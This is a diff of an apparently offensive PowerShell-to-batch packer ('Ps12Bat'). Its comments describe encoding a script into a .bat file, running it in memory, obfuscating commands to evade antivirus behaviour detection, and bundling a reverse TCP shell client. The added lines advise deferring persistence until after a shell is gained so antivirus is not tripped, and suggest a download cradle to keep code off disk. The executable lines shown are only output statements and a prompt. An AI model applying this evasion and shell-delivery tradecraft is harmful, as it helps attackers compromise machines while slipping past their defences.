@@ -2,7 +2,7 @@
 # into a variable then decodes it and executes it in memory the only file 
 # is the .bat file. Additional cmd command type obfuscation will be added to 
 # clear text command string. This change was done to further evade AV behavior 
-# detection engines. The down side to this method is that their is a 
+# detection engines. The down side to this method is that there is a 
 # limitation on how much encoded characters can be included inline. I also added
 # a stripped down version of the reverse tcp client "rsh.ps1" which fits this 
 # requirement on win 7 and 8.1 have not tested 10 yet.
@@ -93,7 +93,10 @@ function genenc-script {
 	write-output "============================================================================"
 }
 function main {
-	write-output "[>] Ps12Bat persistent userland logon exec"
+	# Any persistence will have to be loaded after you get a shell or code exec to prevent AV 
+	# from being tripped. Also instead of a reverse shell you can use a download cradle to retrieve
+	# code, unfortunately this seem to be the only simple way to keep code off disk.
+	write-output "[>] Ps12Bat userland exec"
 	write-output "============================================================================"
 	$pshPath = ''
 	$pshPath = read-host -prompt "[+] Enter path to powershell script "
